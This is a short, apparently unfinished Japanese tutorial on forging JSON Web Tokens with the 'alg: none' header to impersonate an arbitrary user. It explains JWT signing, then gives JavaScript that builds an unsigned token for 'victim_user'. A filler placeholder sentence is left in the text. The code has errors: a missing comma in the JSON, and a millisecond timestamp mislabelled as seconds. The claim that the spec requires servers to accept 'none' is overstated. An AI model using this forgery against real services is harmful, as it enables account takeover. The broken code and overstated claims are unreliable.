# 任意のユーザーに成りすまそう (JWT ヘッダの偽造)

JWT とは、データベースへのアクセスなしにユーザーの認証が可能な画期的な技術です。
以下に、基本的な JWT の動きを示します。
以下では簡単のためハッシュ関数を用いるが、公開鍵暗号を使うことで、署名鍵と確認鍵を分けることも可能。

1. JWT トークンの作成
  - サーバーがクライアントを JWT 以外の方法で認証する
  - 認証情報と有効期限を JSON の形式に起こす
  - JSON とサーバーのシークレットキーを合わせたハッシュ値を取得する
  - JSON とハッシュ値と署名方法 (ヘッダ) の組をクライアントに保存する

2. JWT トークンの認証
  - クライアントから送信された JWT トークンのデータ部分と、サーバーのシークレットキーを合わせたハッシュ値を取得する
  - ハッシュ値とトークンのハッシュ部分が一致すれば、 JWT トークンがでサーバーが発行したものであることが確認できる

(なんかいい感じの文章を挟む)

しかし、JWT には、認証方法をクライアントから送信されたヘッダだよりにするという致命的な欠陥があります。
そして、JWT の仕様により、 `none` (認証をしない) が有効な認証方法である必要があると定められています。
これを利用して、任意のユーザーに成りすましてみましょう。

```js
const jwt_header = `
  {
    "alg": "none",
    "typ": "JWT"
  }
`;
const jwt_body = `
  {
    "exp": ${Date.now() + 1000 /* 失効する時間 (1000秒後に設定した) */}
    "userid": "victim_user"
  }
`;

const jwt_token = `${btoa(jwt_header)}.${btoa(jwt_body)}.`;
```
